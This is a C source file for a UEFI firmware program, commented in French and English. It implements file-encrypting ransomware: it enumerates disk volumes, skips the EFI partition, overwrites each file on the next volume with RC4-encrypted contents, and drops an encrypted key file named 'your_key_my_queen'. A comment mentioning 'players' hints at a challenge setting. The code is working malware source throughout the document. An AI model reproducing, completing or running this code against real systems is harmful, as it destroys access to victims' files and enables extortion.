#include "EncryptFiles_BZH.h"


EFI_STATUS StoreEncryptedRC4Key(EFI_FILE_PROTOCOL *Root, UINT8 *Buffer, UINTN BufferSize) {
  if (Root == NULL || Buffer == NULL || BufferSize != 256) {
      return EFI_INVALID_PARAMETER;
  }
  
  EFI_FILE_PROTOCOL *File;
  EFI_STATUS Status;
  
  // Ouvrir ou créer le fichier
  Status = Root->Open(Root, &File, L"your_key_my_queen", EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
  if (EFI_ERROR(Status)) {
      return Status;
  }
  
  // Écrire dans le fichier
  Status = File->Write(File, &BufferSize, Buffer);
  if (EFI_ERROR(Status)) {
      File->Close(File);
      return Status;
  }
  
  // Fermer le fichier
  File->Close(File);
  return EFI_SUCCESS;
}





// Read and encrypt a file with RC4
EFI_STATUS EncryptFile(EFI_FILE_PROTOCOL *File, CHAR16 *FileName, UINT8 *Rc4Key)
{
  EFI_STATUS Status;
  EFI_FILE_INFO *FileInfo;

  UINTN BufferSize = sizeof(EFI_FILE_INFO) + 256;
  UINTN FileSize;

  UINT8 S[256]; // RC4 state
  UINT8 *FileData;

  FileInfo = AllocatePool(BufferSize);
  if (!FileInfo)
    return EFI_OUT_OF_RESOURCES;

  // Obtenir la taille du fichier
  BufferSize = sizeof(EFI_FILE_INFO) + 256;
  Status = File->GetInfo(File, &gEfiFileInfoGuid, &BufferSize, FileInfo);
  if (EFI_ERROR(Status))
  {
    FreePool(FileInfo);
    return Status;
  }

  FileSize = FileInfo->FileSize;
  
  /*
  Print(L"\n📂 Fichier : %s (%d octets)\n", FileName, FileSize);
  */

  // Allouer un buffer pour le fichier
  FileData = AllocatePool(FileSize);
  if (!FileData)
  {
    FreePool(FileInfo);
    return EFI_OUT_OF_RESOURCES;
  }

  // Lire le fichier
  BufferSize = FileSize;
  Status = File->Read(File, &BufferSize, FileData);
  if (EFI_ERROR(Status))
  {
    FreePool(FileData);
    FreePool(FileInfo);
    return Status;
  }

  /*
  Print(L"RC4 Key in ENCRYPTFILES : \n");
  for(int k=0;k<RC4_KEY_SIZE;++k){
    Print(L"%x ", Rc4Key[k]);
  }
  Print(L"\n");
  */

  // Initialiser RC4 et chiffrer
  Rc4Init(S, Rc4Key, RC4_KEY_SIZE);
  Rc4Encrypt(S, FileData, FileSize);

  /*
  // Afficher les 16 premiers octets chiffrés
  Print(L"Données chiffrées (hex) : ");
  for (UINTN i = 0; i < (FileSize < 16 ? FileSize : 16); i++) {
      Print(L"%02x ", FileData[i]);
  }
  */

  // Revenir au début du fichier pour l'écriture
  Status = File->SetPosition(File, 0);
  if (EFI_ERROR(Status))
  {
    FreePool(FileData);
    FreePool(FileInfo);
    return Status;
  }

  // Écrire les données chiffrées dans le fichier
  BufferSize = FileSize;
  Status = File->Write(File, &BufferSize, FileData);
  if (EFI_ERROR(Status))
  {
    Print(L"Erreur lors de l'écriture du fichier chiffré: %r\n",Status);
    return Status;
  }
  /*
  else
  {
    Print(L"Fichier chiffré et sauvegardé !\n");
  }*/

  // Fermer le fichier et libérer la mémoire
  File->Flush(File);
  FreePool(FileData);
  FreePool(FileInfo);

  return EFI_SUCCESS;
}

// Lister les fichiers et les chiffrer
EFI_STATUS ListAndEncryptFiles(EFI_FILE_PROTOCOL *Root, UINT8 *Rc4Key)
{
  EFI_STATUS Status;
  EFI_FILE_INFO *FileInfo;
  UINTN BufferSize = sizeof(EFI_FILE_INFO) + 256;
  EFI_FILE_PROTOCOL *File;

  FileInfo = AllocatePool(BufferSize);
  if (!FileInfo)
    return EFI_OUT_OF_RESOURCES;

  while (TRUE)
  {
    BufferSize = sizeof(EFI_FILE_INFO) + 256;
    Status = Root->Read(Root, &BufferSize, FileInfo);
    if (EFI_ERROR(Status) || BufferSize == 0)
      break;

    // Open the file with R+W
    Status = Root->Open(Root, &File, FileInfo->FileName, EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (!EFI_ERROR(Status))
    {
      Status = EncryptFile(File, FileInfo->FileName, Rc4Key);
      File->Close(File);
    }
  }

  FreePool(FileInfo);
  return EFI_SUCCESS;
}

EFI_STATUS initEncryption(UINT8 *Rc4Key, UINT8* Rc4KeyEncrypted)
{
  EFI_HANDLE *HandleBuffer;
  UINTN HandleCount;
  UINTN i;

  EFI_STATUS Status;
  Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &HandleBuffer);
  if (EFI_ERROR(Status))
  {
    Print(L"Failure to retrieved disks: %r\n", Status);
    return Status;
  }

  // For each disk, just use the first one here to prevent mistake about players (i<=1)
  for (i = 0; i <= 1; i++)
  {
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
    EFI_FILE_PROTOCOL *Root;

    Status = gBS->HandleProtocol(HandleBuffer[i], &gEfiSimpleFileSystemProtocolGuid, (VOID **)&FileSystem);
    if (EFI_ERROR(Status))
      continue;
    Status = FileSystem->OpenVolume(FileSystem, &Root);
    if (EFI_ERROR(Status))
      continue;

    if (i == 0)
      continue; // Don't touch EFI partition


    Status = ListAndEncryptFiles(Root, Rc4Key);
    if (EFI_ERROR(Status))
    {
      Print(L"Failure to ListAndEncryptFiles: %r\n", Status);
      return Status;
    }

    Status = StoreEncryptedRC4Key(Root,Rc4KeyEncrypted,256);
    if (EFI_ERROR(Status))
    {
      Print(L"Failure to StoreEncryptedRC4Key: %r\n", Status);
      return Status;
    }    
    Root->Close(Root);
  }
  return EFI_SUCCESS;
}